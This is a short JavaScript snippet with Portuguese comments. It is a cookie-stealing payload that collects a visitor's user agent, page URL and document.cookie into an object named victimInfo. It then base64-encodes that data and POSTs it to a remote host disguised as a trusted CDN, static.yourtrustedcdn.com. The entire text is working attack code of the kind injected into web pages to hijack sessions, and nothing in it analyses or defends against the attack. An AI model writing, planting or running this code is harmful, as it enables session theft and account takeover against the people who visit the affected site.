(function() {
    function encodeBase64(data) {
        return btoa(JSON.stringify(data));
    }

    const victimInfo = {
        ua: navigator.userAgent,
        loc: window.location.href,
        cookies: document.cookie
    };

    // Envia as informações coletadas para um endpoint remoto
    fetch('http://static.yourtrustedcdn.com:443/receiver', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: encodeBase64({ type: 'info', data: victimInfo })
    })
    .then(response => response.text())
    .then(data => console.log('Dados enviados com sucesso:', data))
    .catch(error => console.error('Erro ao enviar os dados:', error));
})();
